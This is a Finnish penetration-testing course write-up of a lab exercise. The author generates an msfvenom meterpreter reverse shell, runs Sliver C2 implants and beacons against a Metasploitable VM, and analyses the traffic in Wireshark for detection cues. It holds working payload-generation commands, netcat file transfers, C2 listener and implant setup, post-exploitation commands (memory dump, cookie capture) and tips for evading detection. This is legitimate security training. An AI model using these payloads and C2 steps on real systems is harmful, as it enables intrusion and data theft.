# Harjoitus 6: Koita simpukoita

Kurssi: https://terokarvinen.com/tunkeutumistestaus/ \
Tehtävänanto: https://terokarvinen.com/tunkeutumistestaus/#h6-koita-simpukoita

## a) Venom. Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

MSFvenom on Metasploit-viitekehykseen kuuluva komentorivityökalu hyötykuormien generoimiseen. Se on hyödyllinen etenkin post-exploitation vaiheessa shellin saamiseksi kohteeseen.

Seurasin artikkelia https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control, meterpreter reverse shellin luomiseksi.

Kohteena käytän metasploitablea (192.168.56.101) ja hyökkäyskoneena kali (192.168.56.1).

Ennen seuraavia toimia poistin Kalin internetistä network managerin napista "Disconnect". Testaus:

<img width="300" height="54" alt="image" src="https://github.com/user-attachments/assets/e5e1f8f4-1081-46c2-b638-12f5ee6ac0ae" />

Payloadin luomiseksi käytin seuraavio valintoja:
* `-p linux/x86/meterpreter/reverse_tcp`: Payloadiksi valitaan x86 arkkitehtuurin linuxiin tarkoitettu meterpeter reverse tcp -shell, eli meterpreter ohtaa kohteen koneelta yhteyden hyökkääjään.
* `LHOST=192.168.56.1 LPORT=4444`: Hyökkääjän IP ja portti, johon meterpreter soittaa.
* `-f elf`: Formatiksi valitaan "elf", eli msfvenom tekee payloadista linux binäärin.
* `-o meterpreter`: Luodun binäärin nimeksi annetaan "meterpreter".

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o meterpreter
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: meterpreter
```

En antanut msfvenomille kohteen alustaa `--platform` tai arkkitehtuuria `-a`, mutta msfvenom osasi valita ne käytetyn hyötykuorman perusteella.

Seuraavaksi asetin hyökkäyskoneella metasploitin kuuntelemaan reverse shelliä uudessa ikkunassa. Asetin exploitiksi `multi/handler` payloadin vastaanottamiseksi ja määritin payloadiksi saman mitä käytettiin msfvenomissa, jotta metasploit tietää mitä on tulossa.

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ sudo msfconsole           
...
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
```

Pakollisena payload-asetuksena metasploit tarvitsee LHOST:n ja LPORT:n. Näiden tulee olla samat kuin msfvenomissa.

<img width="781" height="316" alt="image" src="https://github.com/user-attachments/assets/3d5ac0e9-607d-456d-9ee0-e6deb66e88e6" />

LPORT oli oikein, joten asetin LHOST:n.

```
msf exploit(multi/handler) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
```

Laitoin metasploitin kuuntelemaan yhteyttä. Optio `-j` ajaa prosessin taustalla.

```
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.56.1:4444
```

Tässä kohtaa, kun binääri piti saada kohteeseen ja ajaa niin tajusin, että olisi ollut helpompi käyttää suoraan komentoriviltä ajettavaa payloadia meterpreterin bind-shellin kautta. Kaikki oli kuitenkin jo muuten valmista, niin päätin siirtää meterpreter payloadin metasploitableen netcatin avulla.

Yhdistin metasploitablen bind-shelliin netcatin avulla ja laitoin netcatin kuuntelemaan uuteen porttin, ja ohjaamaan outputin tiedostoon meterpreter.

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ nc 192.168.56.101 1524
root@metasploitable:/# nc -l -p 5678 > meterpeter
```

Toisessa ikkunassa lähetin meterpreter tiedoston avaamaani netcat porttiin.

```
┌──(lassi㉿lika)-[~/simpukat]
└─$ cat meterpreter | nc 192.168.56.101 5678 
```

Lopetin muutaman sekunnin päästä yhteydet kummastakin päästä, yhdistin jälleen bind shelliin ja käynnistin meterpreter-ohjelman.

```
root@metasploitable:/# cat meterpeter
ELFT44 �Jj
^1���SCSj�f��̀�[h��8h\��jfXPQW��C̀��yNt=h�Xjj��1�̀��y��'������
                                                           ��
                                                             �}̀��x[�ᙲf�̀��x����̀root@metasploitable:/#
root@metasploitable:/# ./meterpeter
bash: ./meterpeter: Permission denied
root@metasploitable:/# chmod u+x meterpeter
root@metasploitable:/# ./meterpeter
```

Tässä kohtaa metasploit-ikkunaan tuli ilmoitus avatusta meterpreter sessiosta.

```
[*] Sending stage (1062760 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:37601) at 2026-05-02 18:47:41 +0300
```

Lopuksi vielä avasin session ja varmistin, että yhteys toimii.

<img width="533" height="201" alt="image" src="https://github.com/user-attachments/assets/86182364-2427-4379-8960-d8e495354f16" />

Kaikki näytti oikealta, joten meterpreter reverse shell toimi oikein.

## b) Snif venom! Tarkastele ja analysoi msfvenomin muodostamaa reverse shell -yhteyttä. Käytä snifferiä, kuten Wireshark. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa? Millä muutoksilla tunnistamista voi vaikeuttaa?

Reverse shell yhteys on nyt aktiivinen ja käynnistin wiresharkin, `wireshark`. Valitsin kaapattavaksi verkkoliitännäksi kalin ja metasploitablen välisen virtuaaliverkon vboxnet0.

Filtteröin vielä wiresharkin näyttämään vain tcp-protokollan.

<img width="1543" height="482" alt="image" src="https://github.com/user-attachments/assets/f28ce57a-88f9-4e48-b7bd-53652bbac248" />

Kuvan paketit 4-8 ovat meterpreter komennon `sysinfo` aiheittamia, mutta muut ovat meterpreter yhteyden automaattisesti luomia.

Tunnistuksen kannalta olennaista on meterpreterin oletusportti 4444, joka toimii kuuntelevana porttina hyökkääjän koneella. Lisäksi todennäköisesti noin 60 sekunnin välein tapahtuva keepalive, sekä PSH-ACK, PSH-ACK, ACK kaava. Pakettien koko auttaa myös reverse shellin tunnistamisessa (https://www.cyberbit.com/endpoint-security/detecting-reverse-shell-with-machine-learning/).

Harjaantumattomalle silmälle itse TCP-pakettien sisällöstä ei löytynyt paljoaakaan tunnistettavaa tietoa.

<img width="1919" height="712" alt="image" src="https://github.com/user-attachments/assets/9b67fd9a-7c7b-4f0d-83b7-4cf308fee2f1" />

Käyttämäni meterpreter reverse tcp payloadin liikenne ei ole salattua, mutta se lähetetään kuitenkin binäärinä. Olen suhteellisen varma, että tälle liikenteelle on mahdollista rakentaa tunnistus.

Tunnistukselta välttämiseksi aloittaisin luomalla msfvenomilla uuden payloadin, mutta enkoodattuna `-e` useaan kertaan `-i`. Tämä obfuskoi ohjelman ja tekee sen havaitsemisesta kohdekoneella vaikeamman. (https://medium.com/@mahmoudmsallam2002/persistence-technique-and-detection-with-splunk-f174db7bdb94). Käyttäisin reverse tcp payloadin sijasta esimerkiksi reverse https payloadia, jolloin liikenteen sisältö on salattua. Oletusportin 4444 vaihtaminen voi myös auttaa tunnistuksen välttämisessä.

## c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.

Sliver on Command and Control (C2) viitekehys, joka koostuu sliver-serveristä ja sliver-clientista. Sliver-server on palvelin, johon clientit ja kohteet yhdistävät. Sliver-client on operaattorin, eli hyökkääjän komentorivityökalu, jolla ohjataan palvelinta ja kohteita. Implantit ovat sliverin payloadeja, jotka yhdistävät sliver-serveriin. (https://sliver.sh/tutorials/?name=1+-+Getting+Started)

Yhdistin taas kalin verkkoon ja asensin sliverin käyttäen GitHubissa olevaa asennus-skriptiä, `curl https://sliver.sh/install|sudo bash`.

Poistin kalin taas verkosta network managerin kautta.

Käynnistin sliverin ja käytin palvelimena ensimmäistä vaihtoehtoa.

<img width="343" height="126" alt="image" src="https://github.com/user-attachments/assets/94b6457d-02f9-4dbc-89b1-6adc54c5e334" />

Pääsin tämän jälkeen sliveriin.

<img width="525" height="314" alt="image" src="https://github.com/user-attachments/assets/a2472f3f-b803-4c6f-9e2b-284822849994" />

`generate`-komennolla tein uuden implantin. 

<img width="701" height="115" alt="image" src="https://github.com/user-attachments/assets/952d7ff4-9b4b-40d4-9d4d-e484ac094cef" />

Lähetin implantin metasploitableen.

<img width="413" height="48" alt="image" src="https://github.com/user-attachments/assets/474b1252-8580-4e46-bc1a-a7cafcb726d4" />

<img width="386" height="38" alt="image" src="https://github.com/user-attachments/assets/796de5c5-1086-49d3-aae4-dce8954556ad" />

Yritin ajaa binäärin, mutta se ei onnistunut väärän arkkitehtuurin vuoksi.

```
root@metasploitable:/# chmod u+x implant
root@metasploitable:/# ./implant
bash: ./implant: cannot execute binary file
root@metasploitable:/# file implant
implant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
root@metasploitable:/# uname -m
i686
```

Metasploitablen arkkitehtuuri on 32-bittinen, joten lähdin kokeilemaan sliverin linux/386. Kuvassa sliverin tuetut arkkitehtuurit (https://sliver.sh/docs/?name=Payload+Compatibility).

<img width="862" height="416" alt="image" src="https://github.com/user-attachments/assets/80bf33b6-a0c1-4545-84bc-8191d4fa1500" />

Loin uuden binäärin, tällä kertaa toisella arkkitehtuurilla. Arkkitehtuuri ei ole sama kuin metasploitablessa, mutta ainoa linuxin 32-bittinen, joten testasin vielä sitä.

```
[127.0.0.1] sliver > generate --http 192.168.56.1 --os linux --format elf --arch 386

[*] Generating new linux/386 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m11s
[*] Implant saved to /home/lassi/Downloads/TAN_RATE
```

Siirsin implantin metasploitableen, kuten aiemmat ja ajoin sen.

```
root@metasploitable:/# ./implant
```

Binääri ajettiin, mutta mitään ei tapahtunut sliverissä. Tarkastin vielä `sessions` komennolla.

<img width="276" height="67" alt="image" src="https://github.com/user-attachments/assets/934d0ea9-a290-4937-9dac-421ab9452d2c" />

Käynnistin vielä sliverin http- ja https-kuuntelijat ja ajoin implantin uudestaan, mutta siltikään mitään ei tapahtunut.

```
[127.0.0.1] sliver > http --lhost 192.168.56.1 --lport 80

[*] Starting HTTP :80 listener ...
[*] Successfully started job #3

[127.0.0.1] sliver > https --lhost 192.168.56.1 --lport 443

[*] Starting HTTPS :443 listener ...
[*] Successfully started job #4

[127.0.0.1] sliver > jobs

 ID   Name    Protocol   Port   Domains 
==== ======= ========== ====== =========
 3    http    tcp        80             
 4    https   tcp        443            
```

Yrittäessäni ajaa implantia metasploitablessa huomasin, että se ei luonut prosessia.

```
root@metasploitable:/# ./implant
root@metasploitable:/# ps aux |grep implant
root      5100  0.0  0.0   1784   532 ?        R    10:55   0:00 grep implant
```

Tarkastin vielä, että implantti ei ollut muuttunut matkalla vertaamalla niiden tiisteitä.

```
┌──(lassi㉿lika)-[~/Downloads]
└─$ sha256sum TAN_RATE
5dda782d62eca4fe07b2bf4e85790db1905f5e3367b637df8bcfd5ca846e13b3  TAN_RATE

root@metasploitable:/# sha256sum implant
5dda782d62eca4fe07b2bf4e85790db1905f5e3367b637df8bcfd5ca846e13b3  implant
```

Nämä olivat samat, joten ongelmana oli todennäköisesti metasploitablen ei-tuettu arkkitehtuuri i686. On myös mahdollista, että localhost-osoitteessa oleva sliver-server ei saa otettua yhteyttä vastaan, vaikka käynnistin kuuntelijan oikeassa osoitteessa.

Jotta voin nämä kummatkin vaihtoehdot eliminoida samalla, niin päätin ajaa implantin suoraan Kalissa. Tätä varten loin vielä kerran uuden implantin.

```
127.0.0.1] sliver > generate --http localhost --os linux --format elf

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m46s
[*] Implant saved to /home/lassi/Downloads/ARMED_PHYSICAL
```

Tapoin sliveristä vahnat kuuntelijat ja käynnistin uudet localhost-osoitteessa.

```
[127.0.0.1] sliver > jobs -K

[*] Killing job #4 ...
[*] Successfully killed job #4
[*] Killing job #3 ...
[*] Successfully killed job #3

[127.0.0.1] sliver > http --lhost localhost

[*] Starting HTTP :80 listener ...
[*] Successfully started job #5

[127.0.0.1] sliver > https --lhost localhost

[*] Starting HTTPS :443 listener ...
[*] Successfully started job #6
```

Toisessa ikkunassa ajoin implantin.

```
┌──(lassi㉿lika)-[~/Downloads]
└─$ mv ARMED_PHYSICAL ../simpukat                                                                    
                                     
┌──(lassi㉿lika)-[~/Downloads]
└─$ cd ../simpukat 
                                     
┌──(lassi㉿lika)-[~/simpukat]
└─$ ./ARMED_PHYSICAL
```

Heti ajettuani implantin, sliver-ikkunaan tuli näkyviin uusi sessio:

```
[*] Session c1d830b7 ARMED_PHYSICAL - 127.0.0.1:34680 (lika) - linux/amd64 - Sun, 03 May 2026 18:44:51 EEST
```

Komennolla `use` yhdistin sessioon ja ajoin komennon `ls`.

<img width="801" height="199" alt="image" src="https://github.com/user-attachments/assets/2c9931ea-a49a-4487-801d-da1d8ee10992" />

Hakemisto `/home/lassi/simpukat` listattiin sliverissä, eli http-yhteys toimii.

## d) Sniff Sliver! Tarkastele Sliverin http-yhteyttä snifferillä. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa?

Käynnistin wiresharkin, `wireshark`. Valitsin wiresharkissa kaapattavaksi liitännäksi loopback. Kaapatussa liikenteesssä ei näkynyt porttien perusteella palvelimen ja implantin välistä liikennettä, joten aloitin yhteyden uudestaan, mutta tällä kertaa kaapaten myös yhteyden alun. Uudessa yhteydessä kohteen portiksi asettui 51722.

<img width="2112" height="1098" alt="image" src="https://github.com/user-attachments/assets/d1dc8afb-a281-4c2d-89f2-2020c7cd2a54" />

Kaappauksesta huomasin, että kohteen (127.0.0.1:51722) ja palvelimen (127.0.0.1:443) välinen TCP-yhteys kestää handshake mukaan lukien noin 0.02 sekuntia, jonka jälkeen se katkaistaan. Yhteyden katkaistuttua syntyy lähes välittömästi kaksi uutta yhteyttä kohteesta palvelimeen, vain kohteen portti vaihtuu. Tämä kaava toistuu usean kerran tallenteessa ja voi olla tapa tunnistaa sliver.

TLS-yhteyden luonnin yhteydessä voidaan nähdä palvelimen JA3-sormenjälki "Server Hello"-viestissä. 

<img width="2123" height="899" alt="image" src="https://github.com/user-attachments/assets/2260ed8d-adc8-4b3d-88a6-c8d4f53e2f05" />

Kun tämän sormenjäljen googlaa, tekoäly osaa suoraan liittää sen mahdolliseen C2 aktiviteettiin. Lisäksi ehdotuksissa tulee esiin useampi maininta sliveristä.

<img width="1278" height="725" alt="image" src="https://github.com/user-attachments/assets/e78ba6b3-75df-4734-835e-2878e21ad004" />

Sliver palvelimen JA3 sormenjälki on tunnistettavissa.

Huomasin myös, että palvelin ja kohde vaihtavat tietoa noin joka kahdes sekunti. Alla olevassa kuvassa tämä kaava toistuu kahdesti.

<img width="2107" height="344" alt="image" src="https://github.com/user-attachments/assets/672a43fc-d7f8-44e0-8f8d-a1029a3034ee" />

Ensiksi palvelin lähettää kohteelle 204 tavun pituisen paketin, johon kohde vastaa noin 350-380 tavua pitkällä paketilla ja lopuksi palvelin lähettää kohteelle TCP ACK-viestin. Tämä kaava voi olla mahdollista tunnistaa.

## e) Sliverillä voit muuttaa yhteyden ominaisuuksia. Kokeile ja näytä esimerkki. Muista todeta testein, että muutokset toimivat.

Session yhteyksiin käytetään yhtä TCP-yhteyttä koko session ajan, kun taas beacon yhteyksissä kohde ottaa yhteyden palvelimeen tietyin välein. Beaconeilla on mahdollista muokata tätä  jälkikäteen. (https://sliver.sh/tutorials/?name=2+-+Beacons+vs+Sessions). Sessioiden osalta en dokumentaatiosta löytänyt kuinka aktiivisen implantin yhteyden ominaisuuksia on mahdollista muokata, jos näitä ominaisuuksia ei ole luontivaiheessa implanttiin sisäänrakennettu. Implantin luontivaiheessa yhteyttä on mahdollista muokata aina protokollista, niiden käyttäytymiseen, endpointeihin ja sertifikaatteihin (https://sliver.sh/docs/?name=C2+Advanced+Options).

Beaconin yhteyden muokkaamisen testaamiseksi generoin beacon implantin.

```
[127.0.0.1] sliver (ARMED_PHYSICAL) > background
[*] Background ...

[127.0.0.1] sliver > generate beacon --http localhost --os linux --seconds 60 --jitter 5
[*] Generating new linux/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 3m47s
[*] Implant saved to /home/lassi/Downloads/COURAGEOUS_FENDER
```
* `--seconds 60`: Beacon ottaa yhteyden palvelimeen joka 60 sekunti.
* `--jitter 5`: Beacon ottaa yhteyden palvelimeen +-5 sekunnin sisällä määritetystä ajasta.

Ajoin binäärin kalissa, `./COURAGEOUS_FENDER`.

Sliverissä beacon tuli näkyviin ja yhdistin siihen.

```
[*] Beacon d090567b COURAGEOUS_FENDER - 127.0.0.1:52212 (lika) - linux/amd64 - Sun, 03 May 2026 21:41:49 EEST

[127.0.0.1] sliver > beacons
 ID         Name                Transport   Hostname   Username   Operating System   Last Check-In   Next Check-In 
========== =================== =========== ========== ========== ================== =============== ===============
 d090567b   COURAGEOUS_FENDER   http(s)     lika       lassi      linux/amd64        20s             44s

[127.0.0.1] sliver > use
[*] Active beacon COURAGEOUS_FENDER (d090567b-26df-4ad2-bbf1-0a300f66e72e)
```

`reconfig`-komento mahdollistaa mm. yhteyden välin, jitterin ja palvelimen osoitteen muuttamisen jälkikäteen.

<img width="614" height="242" alt="image" src="https://github.com/user-attachments/assets/1bdccec7-e1ac-44f3-82c6-7514f51a3935" />

Muokkasin check-in aikaa, sekä jitteriä `reconfig`-komennolla.

```
[127.0.0.1] sliver (COURAGEOUS_FENDER) > reconfig -i 1000s -j 60s
[*] Tasked beacon COURAGEOUS_FENDER (ed190ebf)
[+] COURAGEOUS_FENDER completed task ed190ebf
[*] Reconfigured beacon
```

Muutosten jälkeen sliver ilmoitti check-in väliksi 1000 sekuntia eli noin 17 minuutia vanhan 60 sekuntin sijaan.

<img width="1023" height="94" alt="image" src="https://github.com/user-attachments/assets/db222331-bbfd-4338-a7a6-1ff53c879f14" />

Muutoksesta huomioitavaa on, että komennot ajetaan kohteessa vain check-in:n yhteydessä. Tässä tapauksessa komentojen ajaminen voi kestää pisimmillään noin 17 minuuttia.

## f) Sliverillä voi tehdä monenlaista kohteessa, ruutukaappauksista alkaen. Näytä esimerkkejä toiminnoista.

Sliverin demonstroimiseksi tehokkaasti tapoin beaconin ja otin yhteyden sessioon.

<img width="695" height="220" alt="image" src="https://github.com/user-attachments/assets/d6bee5fd-7348-4446-9057-142aa07c1454" />

Sliverissä löytyy paljon mielenkiintoisia toimintoja, joista suurin osa löytyy myös meterpreteristä.

<img width="789" height="1240" alt="image" src="https://github.com/user-attachments/assets/2b2e9cc2-626f-46fa-868f-4173a2aee531" />

Yksi mielenkiintoinen ominaisuus on `procdump`, jonka avulla käynnissä olevan prosessin muisti voidaan dumpata. Dumpit voivat sisältää dataa kuten salasanoja tai avaimia.

```
[127.0.0.1] sliver (ARMED_PHYSICAL) > ps
...
173918   3866     sliver                             
177437   79282    ARMED_PHYSICAL

[127.0.0.1] sliver (ARMED_PHYSICAL) > procdump --name ARMED_PHYSICAL
[*] Process dump stored in: /tmp/procdump_lika_177437_3846532757
```

Toinen mielenkiintoinen komento on `hex-edit`, joka mahdollistaa nimensä mukaisesti teidostojen heksakoodin muokkaamisen.

```
[127.0.0.1] sliver (ARMED_PHYSICAL) > ls
/home/lassi/simpukat (3 items, 32.7 MiB)
========================================
drwxrwxr-x  lassi:lassi  .               <dir>     Sun May 03 18:43:20 +0300 2026
-rwx------  lassi:lassi  ARMED_PHYSICAL  32.7 MiB  Sun May 03 18:10:43 +0300 2026
-rwxrw-r--  lassi:lassi  meterpreter     207 B     Sat May 02 18:06:51 +0300 2026


[127.0.0.1] sliver (ARMED_PHYSICAL) > hex-edit meterpreter
```

<img width="705" height="319" alt="image" src="https://github.com/user-attachments/assets/68a23149-82ce-4952-9b71-2ee67fbb7f1a" />

Muita mielenkiintoisia komentoja ovat `msf` ja `msf-inject`, jotka mahdollistavat metasploit hyötykuormien ajon kohteessa. `cursed` mahdollistaa selainten ja selainpohjaisten sovellusten debuggaamisen, jonka avulla voidaan kaapata esimerkiksi keksejä.

## Lähteet

Karvinen 2026: Koita simpukoita: https://terokarvinen.com/tunkeutumistestaus/#h6-koita-simpukoita

Beale 2022: How to Use Metasploit Meterpreter for Command & Control: Step-by-step: https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control

Zabar 2018: Detecting Reverse Shell with Machine Learning: https://www.cyberbit.com/endpoint-security/detecting-reverse-shell-with-machine-learning/

Msallam 2025: Persistence Technique and Detection with Splunk: https://medium.com/@mahmoudmsallam2002/persistence-technique-and-detection-with-splunk-f174db7bdb94

Sliver: 1 - Getting Started: https://sliver.sh/tutorials/?name=1+-+Getting+Started

Sliver: Payload Compatibility: https://sliver.sh/docs/?name=Payload+Compatibility

Sliver: Beacons vs Sessions: https://sliver.sh/tutorials/?name=2+-+Beacons+vs+Sessions

Sliver: C2 Advanced Options: https://sliver.sh/docs/?name=C2+Advanced+Options
